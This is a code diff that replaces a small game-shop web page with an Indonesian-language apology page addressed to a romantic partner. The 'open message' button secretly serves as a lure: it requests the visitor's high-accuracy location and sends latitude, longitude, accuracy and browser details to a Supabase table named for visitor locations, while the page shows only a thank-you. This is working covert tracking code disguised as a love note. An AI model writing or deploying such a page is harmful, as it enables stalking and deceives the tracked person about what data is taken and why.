@@ -1,10 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Item Shop</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Untuk Sayang ❤️</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+body{
+  font-family:Arial,sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  background:#ffe4e6;
+  text-align:center;
+  margin:0;
+}
+
+.card{
+  background:white;
+  padding:30px;
+  border-radius:20px;
+  max-width:600px;
+  box-shadow:0 10px 30px rgba(0,0,0,.15);
+}
+</style>
 </head>
 <body>
-    <h1>Welcome To Item Shop</h1>
-    <p>Website shop game saya.</p>
+
+<div class="card">
+  <h1>💖 Untuk Sayang 💖</h1>
+
+  <p>
+    Maafin aku ya sayang aku janji ga akan ngulangin lagi.
+    Kalo ketahuan ngulangin lagi aku siap di tumbalin ke janda hutan.
+  </p>
+
+  <button onclick="kirimLokasi()">
+    Buka Pesan ❤️
+  </button>
+
+  <p id="status"></p>
+</div>
+
+<script>
+const supabaseUrl = "https://PROJECT.supabase.co";
+const supabaseKey = "ANON_KEY";
+
+const supabaseClient =
+  supabase.createClient(supabaseUrl, supabaseKey);
+
+async function kirimLokasi() {
+
+  document.getElementById("status").innerText =
+    "Meminta izin lokasi...";
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+
+      const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        user_agent: navigator.userAgent
+      };
+
+      const { error } =
+        await supabaseClient
+        .from("visitor_locations")
+        .insert(data);
+
+      if(error){
+        document.getElementById("status").innerText =
+          "Gagal menyimpan data";
+        console.error(error);
+        return;
+      }
+
+      document.getElementById("status").innerText =
+        "Terima kasih ❤️";
+    },
+
+    (err) => {
+      document.getElementById("status").innerText =
+        "Izin lokasi ditolak.";
+    },
+
+    {
+      enableHighAccuracy: true
+    }
+  );
+}
+</script>
+
 </body>
 </html>
